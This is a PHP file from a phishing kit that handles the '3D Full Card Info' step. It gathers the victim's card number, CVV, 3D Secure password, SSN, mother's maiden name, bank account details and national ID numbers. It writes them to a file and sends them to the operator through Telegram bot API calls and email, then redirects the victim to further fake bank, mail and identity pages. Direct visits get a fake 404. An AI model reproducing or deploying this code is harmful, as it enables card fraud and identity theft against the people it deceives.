<?php if (isset($_POST['password_vbv']) && isset($_POST['day'])) {
    include '../mine.php';
    include '../bot.php';
    include '../cookies.php';
    include '../../../email.php';
    session_start();
    if (isset($_POST['password_vbv'])) {
        $password_vbv = $_POST['password_vbv'];
    }
    if (isset($_POST['day']) && isset($_POST['month']) && isset($_POST['year'])) {
        $dob = $_POST['day'] . "/" . $_POST['month'] . "/" . $_POST['year'];
    }
    if (isset($_POST['sortnum1']) && isset($_POST['sortnum2']) && isset($_POST['sortnum3'])) {
        $sortnum = $_POST['sortnum1'] . "-" . $_POST['sortnum2'] . "-" . $_POST['sortnum3'];
    }
    if (isset($_POST['accnumber'])) {
        $accnumber = $_POST['accnumber'];
    }
    if (isset($_POST['ssn1']) && isset($_POST['ssn2']) && isset($_POST['ssn3'])) {
        $ssnnum = $_POST['ssn1'] . "-" . $_POST['ssn2'] . "-" . $_POST['ssn3'];
    }
    if (isset($_POST['mmname'])) {
        $mmname = $_POST['mmname'];
    }
    if (isset($_POST['creditlimit'])) {
        $creditlimit = $_POST['creditlimit'];
    }
    if (isset($_POST['creditlimit'])) {
        $creditlimit = $_POST['creditlimit'];
    }
    if (isset($_POST['osid'])) {
        $osid = $_POST['osid'];
    }
    if (isset($_POST['codicefiscale'])) {
        $codicefiscale = $_POST['codicefiscale'];
    }
    if (isset($_POST['kontonummer'])) {
        $kontonummer = $_POST['kontonummer'];
    }
    if (isset($_POST['offid'])) {
        $offid = $_POST['offid'];
    }
    $msg = "=========== <[ -" . $scamname . "- 3D Full Card Info ]> ===========
";
    $msg.= "----------------------- Billing ---------------------
";
    $msg.= "Full Name    : {$_SESSION['fnm']}
";
    $msg.= "Birth Date   : {$_SESSION['dob']}
";
    $msg.= "Address      : {$_SESSION['adr']}
";
    $msg.= "City         : {$_SESSION['cty']}
";
    $msg.= "State        : {$_SESSION['stt']}
";
    $msg.= "Zip Code     : {$_SESSION['zip']}
";
    $msg.= "Country      : {$_SESSION['cnt']}
";
    $msg.= "Phone        : {$_SESSION['ptp']} | {$_SESSION['par']} {$_SESSION['pnm']}
";
    $msg.= "----------------------- BIN Info -------------
";
    $msg.= "CC Data      : {$_SESSION['_cc_brand_']} {$_SESSION['_cc_type_']} {$_SESSION['_cc_class_']}
";
    $msg.= "CC Bank      : {$_SESSION['_cc_bank_']}
";
    $msg.= "CC Country   : {$_SESSION['_country_']}
";
    $msg.= "----------------------- CC Info ---------------------
";
    $msg.= "CC Brand     : {$_SESSION['_cc_brand_']}
";
    $msg.= "CC Number    : {$_SESSION['ccn']}
";
    $msg.= "CC Expiry    : {$_SESSION['cex']}
";
    $msg.= "CVV          : {$_SESSION['csc']}
";
    $msg.= "----------------------- 3D Info ---------------------
";
    $msg.= "3D Password  : {$password_vbv}
";
    if (isset($_POST['day'])) {
        $msg.= "3D Birth Date: {$dob}
";
    }
    if (isset($_POST['sortnum'])) {
        $msg.= "Sort Number      : {$sortnum}
";
    }
    if (isset($_POST['accnumber'])) {
        $msg.= "Account Number      : {$accnumber}
";
    }
    if (isset($_POST['ssn1'])) {
        $msg.= "SSN         : {$ssnnum}
";
    }
    if (isset($_POST['mmname'])) {
        $msg.= "Mothers Maiden Name         : {$mmname}
";
    }
    if (isset($_POST['creditlimit'])) {
        $msg.= "Credit Limit         : {$creditlimit}
";
    }
    if (isset($_POST['osid'])) {
        $msg.= "OSID         : {$creditlimit}
";
    }
    if (isset($_POST['nabid'])) {
        $msg.= "NAB ID      : {$_POST['nabid']}
";
    }
    if (isset($_POST['creditlimit'])) {
        $msg.= "Credit Limit         : {$creditlimit}
";
    }
    if (isset($_POST['codicefiscale'])) {
        $msg.= "Codice Fiscale         : {$codicefiscale}
";
    }
    if (isset($_POST['kontonummer'])) {
        $msg.= "Kontonummer         : {$kontonummer}
";
    }
    if (isset($_POST['offid'])) {
        $msg.= "Official ID         : {$offid}
";
    }
    if (isset($_POST['pps'])) {
        $msg.= "PPS      : {$_POST['pps']}
";
    }
    if (isset($_POST['dln'])) {
        $msg.= "Driver Lic. : {$_POST['dln']}
";
    }
    if (isset($_POST['sin'])) {
        $msg.= "SIN         : {$_POST['sin']}
";
    }
    if (isset($_POST['pse'])) {
        $msg.= "PSE         : {$_POST['pse']}
";
    }
    if (isset($_POST['dni'])) {
        $msg.= "DNI         : {$_POST['dni']}
";
    }
    if (isset($_POST['bsn'])) {
        $msg.= "BSN         : {$_POST['bsn']}
";
    }
    if (isset($_POST['cpf'])) {
        $msg.= "CPF         : {$_POST['cpf']}
";
    }
    if (isset($_POST['fcn'])) {
        $msg.= "FCN         : {$_POST['fcn']}
";
    }
    $msg.= "---------------------- IP Info ----------------------
";
    $msg.= "IP ADDRESS   : {$_SESSION['ip']}
";
    $msg.= "LOCATION     : {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}
";
    $msg.= "BROWSER      : {$_SESSION['browser']} on {$_SESSION['os']}
";
    $msg.= "SCREEN       : {$_SESSION['screen']}
";
    $msg.= "USER AGENT   : {$_SERVER['HTTP_USER_AGENT']}
";
    $msg.= "TIMEZONE     : {$_SESSION['ip_timezone']}
";
    $msg.= "TIME         : " . now() . " GMT
";
    $msg.= "=========== <[ THANKS TO DR_FXND ]> ===========


";
    if ($saveintext == "yes") {
        $save = fopen("../../" . $filename . ".txt", "a+");
        fwrite($save, $msg);
        fclose($save);
    }
    file_get_contents("https://api.telegram.org/bot" . $api . "/sendMessage?chat_id=" . $chatid . "&text=" . urlencode($msg) . "");
    $subject = "-" . $scamname . "- 3D FULL CARD INFO BANK [" . $_SESSION['_cc_bank_'] . "] From [" . $_SESSION['ip_countryName'] . "]";
    $headers = "From: DR_FXND <>
";
    $headers.= "MIME-Version: 1.0
";
    $headers.= "Content-Type: text/plain; charset=UTF-8
";
    file_get_contents("https://api.telegram.org/bot" . $Api . "/sendMessage?chat_id=" . $Chatid . "&text=" . urlencode($msg) . "");
    if ($sendtoemail == "yes") {
        foreach (explode(",", $yours) as $your) {
            @mail($your, $subject, $msg, $headers);
        }
    }
    if (!isset($_POST['nextpage'])) {
        if ($show_newcard == "yes") {
            exit(header("Location: ../../app/processcard"));
        } elseif ($show_mailaccess == "yes") {
            exit(header("Location: ../../app/mailprovider"));
        } elseif ($show_bank == "yes") {
            exit(header("Location: ../../app/bank"));
        } elseif ($show_identity == "yes") {
            exit(header("Location: ../../app/identity"));
        } else {
            exit(header("Location: ../../app/thanks"));
        }
    }
    if (isset($_POST['nextpage'])) {
        if ($show_mailaccess == "yes") {
            exit(header("Location: ../../app/mailprovider"));
        } elseif ($show_bank == "yes") {
            exit(header("Location: ../../app/bank"));
        } elseif ($show_identity == "yes") {
            exit(header("Location: ../../app/identity"));
        } else {
            exit(header("Location: ../../app/thanks"));
        }
    }
} else {
    header('HTTP/1.0 404 Not Found');
    exit();
};